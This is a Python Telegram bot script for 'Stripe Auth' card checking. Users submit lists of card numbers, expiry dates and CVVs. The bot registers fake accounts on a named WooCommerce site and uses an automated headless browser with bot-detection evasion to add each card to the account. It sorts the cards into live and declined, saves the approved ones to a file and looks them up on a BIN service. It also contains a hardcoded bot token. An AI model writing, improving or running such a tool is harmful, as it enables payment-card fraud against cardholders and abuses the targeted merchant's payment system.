import os
import re
import time
import random
import asyncio
from threading import Thread, Lock
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

BOT_TOKEN = os.environ.get("BOT_TOKEN", "7604714419:AAGVMdDp-FyFTOMJgrW9_Mm04T-pvNhSiNY")
BASE_URL = "https://associationsmanagement.com"
MY_ACCOUNT_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
PAYMENT_METHODS_URL = f"{BASE_URL}/my-account/payment-methods/"
DEFAULT_ZIP = "10080"
ALLOWED_USERS = []

FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez", "wilson", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "perez", "thompson"]
DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "aol.com"]

stop_flag = False
stop_lock = Lock()
bin_session = requests.Session()
bin_session.headers.update({"User-Agent": "Mozilla/5.0"})
bin_cache = {}


def is_allowed(user_id):
    if not ALLOWED_USERS:
        return True
    return user_id in ALLOWED_USERS


def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    if len(digits) < 13:
        return False
    checksum = 0
    reverse_digits = digits[::-1]
    for i, d in enumerate(reverse_digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def dato(bin_code):
    if bin_code in bin_cache:
        return bin_cache[bin_code]
    try:
        api_url = bin_session.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5).json()
        brand = api_url.get("brand", "Unknown")
        card_type = api_url.get("type", "Unknown")
        level = api_url.get("level", "Unknown")
        bank = api_url.get("bank", "Unknown")
        country_name = api_url.get("country_name", "Unknown")
        country_flag = api_url.get("country_flag", "??")
        result = f"{brand} - {card_type} - {level}"
        details = f"{bank} - {country_name} {country_flag}"
        bin_cache[bin_code] = (result, details, country_flag, bank, country_name)
        return result, details, country_flag, bank, country_name
    except Exception:
        bin_cache[bin_code] = ("Unknown", "N/A", "??", "N/A", "Unknown")
        return "Unknown", "N/A", "??", "N/A", "Unknown"


def parse_card(card_str):
    card_str = card_str.strip()
    if not card_str or card_str.startswith('#'):
        return None
    if '/' in card_str:
        parts = card_str.split('|')
        if len(parts) == 3:
            cc = parts[0].strip()
            my = parts[1].split('/')
            if len(my) == 2:
                card_str = f"{cc}|{my[0].strip()}|{my[1].strip()}|{parts[2].strip()}"
    parts = card_str.split('|')
    if len(parts) != 4:
        return None
    cc = parts[0].strip().replace(' ', '')
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    cvv = parts[3].strip()
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return None
    if not month.isdigit() or int(month) < 1 or int(month) > 12:
        return None
    if not year.isdigit():
        return None
    if len(year) == 2:
        year = "20" + year
    elif len(year) != 4:
        return None
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return None
    return cc, month, year, cvv


def generate_realistic_email():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    ts = str(int(time.time()))[-6:]
    rn = random.randint(1000, 9999)
    domain = random.choice(DOMAINS)
    p = [f"{first}.{last}.{ts}", f"{first}{last}{rn}", f"{first}_{last}_{ts}"]
    return f"{random.choice(p)}@{domain}"


def setup_driver():
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
    options.add_argument('--blink-settings=imagesEnabled=false')
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-software-rasterizer')
    options.binary_location = os.environ.get("CHROME_PATH", "/usr/bin/chromium")
    driver = webdriver.Chrome(options=options)
    driver.set_page_load_timeout(15)
    driver.set_window_size(1920, 1080)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver


def register(driver, email):
    print(f"Registering: {email}...")
    driver.get(MY_ACCOUNT_URL)
    wait = WebDriverWait(driver, 8)
    try:
        rf = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "register")))
        nonce = rf.find_element(By.NAME, "woocommerce-register-nonce").get_attribute("value")
    except:
        m = re.search(r'woocommerce-register-nonce["\']:\s*["\']([^"\']+)', driver.page_source)
        if m:
            nonce = m.group(1)
        else:
            raise Exception("nonce not found")
    ei = wait.until(EC.presence_of_element_located((By.ID, "reg_email")))
    ei.clear()
    ei.send_keys(email)
    driver.find_element(By.NAME, "register").click()
    time.sleep(1.5)
    errs = driver.find_elements(By.CLASS_NAME, "woocommerce-error")
    if errs:
        et = errs[0].text
        if "already registered" in et:
            return False, "email_exists"
        return False, et
    if "logout" not in driver.page_source.lower():
        return False, "no_logout"
    return True, "success"


def add_card(driver, card_data):
    cn, mo, yr, cv = card_data
    exp = f"{mo}{yr[-2:]}"
    print(f"Checking ****{cn[-4:]}...")
    driver.get(ADD_PAYMENT_URL)
    wait = WebDriverWait(driver, 12)
    try:
        si = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='Secure payment input frame']")))
        driver.switch_to.frame(si)
    except:
        try:
            si = wait.until(EC.presence_of_element_located((By.TAG_NAME, "iframe")))
            driver.switch_to.frame(si)
        except:
            return False, "iframe_not_found"
    try:
        wait.until(EC.presence_of_element_located((By.NAME, "number"))).send_keys(cn)
        driver.find_element(By.NAME, "expiry").send_keys(exp)
        driver.find_element(By.NAME, "cvc").send_keys(cv)
        driver.find_element(By.NAME, "postalCode").send_keys(DEFAULT_ZIP)
        time.sleep(0.3)
    except Exception as e:
        driver.switch_to.default_content()
        return False, str(e)
    driver.switch_to.default_content()
    time.sleep(1)
    sb = None
    for by, sel in [
        (By.XPATH, "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"),
        (By.XPATH, "//button[contains(text(), 'Add payment method')]"),
        (By.NAME, "woocommerce_add_payment_method"),
        (By.CSS_SELECTOR, "button.button.alt"),
    ]:
        try:
            sb = wait.until(EC.element_to_be_clickable((by, sel)))
            break
        except:
            continue
    if not sb:
        try:
            sb = driver.find_element(By.CSS_SELECTOR, "form[method='post']").find_element(By.CSS_SELECTOR, "button[type='submit']")
        except:
            return False, "no_submit_button"
    driver.execute_script("arguments[0].scrollIntoView(true);", sb)
    time.sleep(0.2)
    try:
        sb.click()
    except:
        driver.execute_script("arguments[0].click();", sb)
    try:
        WebDriverWait(driver, 12).until(
            lambda d: "/my-account/payment-methods/" in d.current_url or "Payment method successfully added" in d.page_source or len(d.find_elements(By.CSS_SELECTOR, ".woocommerce-error")) > 0
        )
        if "Payment method successfully added" in driver.page_source:
            return True, "success"
        errs = driver.find_elements(By.CSS_SELECTOR, ".woocommerce-error")
        if errs:
            return False, errs[0].text.split('\n')[0][:50]
        if "/my-account/payment-methods/" in driver.current_url:
            return True, "success"
        return False, "unknown_error"
    except:
        return False, "timeout"


def delete_card_from_site(driver):
    try:
        driver.get(PAYMENT_METHODS_URL)
        time.sleep(0.8)
        for by, sel in [(By.XPATH, "//a[contains(text(), 'Delete')]"), (By.CSS_SELECTOR, "a.delete"), (By.CSS_SELECTOR, "a[href*='delete-payment-method']")]:
            try:
                btn = driver.find_element(by, sel)
                btn.click()
                time.sleep(0.8)
                try:
                    driver.find_element(By.XPATH, "//button[contains(text(), 'Confirm')]").click()
                except:
                    pass
                time.sleep(1)
                return
            except:
                continue
    except:
        pass


def logout(driver):
    try:
        driver.get(MY_ACCOUNT_URL)
        time.sleep(0.5)
        for by, sel in [(By.XPATH, "//a[contains(@href, 'customer-logout')]"), (By.XPATH, "//a[contains(text(), 'Logout')]")]:
            try:
                driver.find_element(by, sel).click()
                time.sleep(0.5)
                return
            except:
                continue
    except:
        pass


def save_approved_card(card_data, bin_info):
    try:
        with open("approved_cards.txt", "a", encoding="utf-8") as f:
            f.write(f"{card_data[0]}|{card_data[1]}|{card_data[2]}|{card_data[3]} | {bin_info}\n")
    except:
        pass


def process_single_card(card_data):
    driver = None
    try:
        driver = setup_driver()
        rs = False
        ra = 0
        while not rs and ra < 2:
            email = generate_realistic_email()
            ra += 1
            ok, err = register(driver, email)
            if ok:
                rs = True
            elif err != "email_exists":
                return ("error", f"Reg failed: {err}")
        if not rs:
            return ("error", "Cannot register")
        success, message = add_card(driver, card_data)
        if success:
            delete_card_from_site(driver)
            logout(driver)
            return ("success", card_data)
        else:
            logout(driver)
            return ("fail", message)
    except Exception as e:
        return ("error", str(e))
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


def process_batch_cards(cards, update, context, loop, pmid):
    global stop_flag
    total = len(cards)
    ac = 0
    dc = 0
    sc_cards = []
    lock = Lock()
    with stop_lock:
        stop_flag = False
    driver = setup_driver()
    try:
        for idx, card in enumerate(cards, 1):
            with stop_lock:
                if stop_flag:
                    asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=pmid, text="Stopped.", reply_markup=None), loop)
                    return
            cs = f"{card[0]}|{card[1]}|{card[2]}|{card[3]}"
            csh = cs[:22] + "..."
            pr = int((idx / total) * 100)
            bi, bd, cf, bk, cn = dato(card[0][:6])
            kb = [
                [InlineKeyboardButton(f"Card: {csh}", callback_data="u8")],
                [InlineKeyboardButton(f"Response: ...", callback_data="u8")],
                [InlineKeyboardButton(f"Info: {bi}", callback_data="x")],
                [InlineKeyboardButton(f"Approved: [ {ac} ]", callback_data="x")],
                [InlineKeyboardButton(f"Declined: [ {dc} ]", callback_data="x")],
                [InlineKeyboardButton(f"Total: [ {total} ] - {pr}%", callback_data="x")],
                [InlineKeyboardButton("[ STOP ]", callback_data="stop")]
            ]
            rm = InlineKeyboardMarkup(kb)
            asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=pmid, text="Checking...", reply_markup=rm), loop)
            rs = False
            ra = 0
            while not rs and ra < 2:
                email = generate_realistic_email()
                ra += 1
                ok, err = register(driver, email)
                if ok:
                    rs = True
                elif err != "email_exists":
                    break
            if not rs:
                with lock:
                    dc += 1
                kb[1][0] = InlineKeyboardButton("Response: Reg Failed", callback_data="u8")
                kb[4][0] = InlineKeyboardButton(f"Declined: [ {dc} ]", callback_data="x")
                asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=pmid, text="Checking...", reply_markup=InlineKeyboardMarkup(kb)), loop)
                continue
            success, message = add_card(driver, card)
            if success:
                with lock:
                    ac += 1
                    sc_cards.append(card)
                st = (
                    f"APPROVED {cf}\n\n"
                    f"Card: `{card[0]}|{card[1]}|{card[2]}|{card[3]}`\n"
                    f"Gateway: Stripe Auth\n"
                    f"Response: Approved\n\n"
                    f"BIN: {bi}\n"
                    f"Bank: {bd}\n"
                    f"Bot by @AmrElwani"
                )
                asyncio.run_coroutine_threadsafe(update.message.reply_text(st, parse_mode='Markdown'), loop)
                save_approved_card(card, bi)
                delete_card_from_site(driver)
                lr = "Approved"
            else:
                with lock:
                    dc += 1
                lr = message[:30]
            kb[1][0] = InlineKeyboardButton(f"Response: {lr}", callback_data="u8")
            kb[3][0] = InlineKeyboardButton(f"Approved: [ {ac} ]", callback_data="x")
            kb[4][0] = InlineKeyboardButton(f"Declined: [ {dc} ]", callback_data="x")
            asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=pmid, text="Checking...", reply_markup=InlineKeyboardMarkup(kb)), loop)
            logout(driver)
    except Exception as e:
        asyncio.run_coroutine_threadsafe(update.message.reply_text(f"Error: {str(e)}"), loop)
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass
    ft = (
        f"Done!\n\n"
        f"Auth: {ac}\n"
        f"Decline: {dc}\n"
        f"Total: {total}"
    )
    asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=pmid, text=ft, parse_mode='Markdown'), loop)
    if sc_cards:
        lines = ["Approved cards:"]
        for c in sc_cards:
            lines.append(f"`{c[0]}|{c[1]}|{c[2]}|{c[3]}`")
        asyncio.run_coroutine_threadsafe(update.message.reply_text("\n".join(lines), parse_mode='Markdown'), loop)


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Not allowed.")
        return
    await update.message.reply_text(
        "Stripe Auth Bot\n\n"
        "Format: CC|MM|YYYY|CVV\n"
        "Or: CC|MM/YYYY|CVV\n\n"
        "Send card or upload .txt file"
    )


async def handle_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Not allowed.")
        return
    card = parse_card(update.message.text)
    if not card:
        await update.message.reply_text("Invalid format.")
        return
    if not luhn_check(card[0]):
        await update.message.reply_text("Invalid card (Luhn).")
        return
    bi, bd, cf, bk, cn = dato(card[0][:6])
    await update.message.reply_text(f"Checking...\n\nBIN: {bi}\n{bd}", parse_mode='Markdown')
    loop = asyncio.get_running_loop()

    def worker():
        result = process_single_card(card)
        asyncio.run_coroutine_threadsafe(send_result(update, context, result, card), loop)

    Thread(target=worker).start()


async def send_result(update: Update, context: ContextTypes.DEFAULT_TYPE, result, card):
    bi, bd, cf, bk, cn = dato(card[0][:6])
    if result[0] == "success":
        save_approved_card(card, bi)
        text = (
            f"APPROVED {cf}\n\n"
            f"Card: `{card[0]}|{card[1]}|{card[2]}|{card[3]}`\n"
            f"Gateway: Stripe Auth\n"
            f"Response: Approved\n\n"
            f"BIN: {bi}\n"
            f"Bank: {bd}\n"
            f"Bot by @AmrElwani"
        )
        await update.message.reply_text(text, parse_mode='Markdown')
    elif result[0] == "fail":
        await update.message.reply_text(f"DECLINED\n\n`{card[0]}|{card[1]}|{card[2]}|{card[3]}`\n{result[1]}", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"Error: {result[1]}")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Not allowed.")
        return
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("Send .txt only.")
        return
    file = await doc.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8', errors='ignore').splitlines()
    cards = []
    skipped = 0
    for line in lines:
        card = parse_card(line)
        if card:
            if luhn_check(card[0]):
                cards.append(card)
            else:
                skipped += 1
    if not cards:
        msg = "No valid cards found."
        if skipped > 0:
            msg += f"\nSkipped: {skipped}"
        await update.message.reply_text(msg)
        return
    extra = f"\nSkipped: {skipped}" if skipped > 0 else ""
    kb = [
        [InlineKeyboardButton("...", callback_data="u8")],
        [InlineKeyboardButton("Response: ...", callback_data="u8")],
        [InlineKeyboardButton("Info: ...", callback_data="x")],
        [InlineKeyboardButton("Approved: [ 0 ]", callback_data="x")],
        [InlineKeyboardButton("Declined: [ 0 ]", callback_data="x")],
        [InlineKeyboardButton(f"Total: [ {len(cards)} ] - 0%", callback_data="x")],
        [InlineKeyboardButton("[ STOP ]", callback_data="stop")]
    ]
    msg = await update.message.reply_text(f"Checking {len(cards)} cards...{extra}", reply_markup=InlineKeyboardMarkup(kb))
    pmid = msg.message_id
    loop = asyncio.get_running_loop()
    Thread(target=process_batch_cards, args=(cards, update, context, loop, pmid)).start()


async def stop_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    query = update.callback_query
    await query.answer()
    if query.data == "stop":
        with stop_lock:
            stop_flag = True
        await query.edit_message_text("Stopping...")


async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Your ID: `{update.effective_user.id}`", parse_mode='Markdown')


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("myid", myid_cmd))
    app.add_handler(CallbackQueryHandler(stop_batch, pattern="stop"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_single))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("Bot started...")
    app.run_polling()


if __name__ == "__main__":
    main()
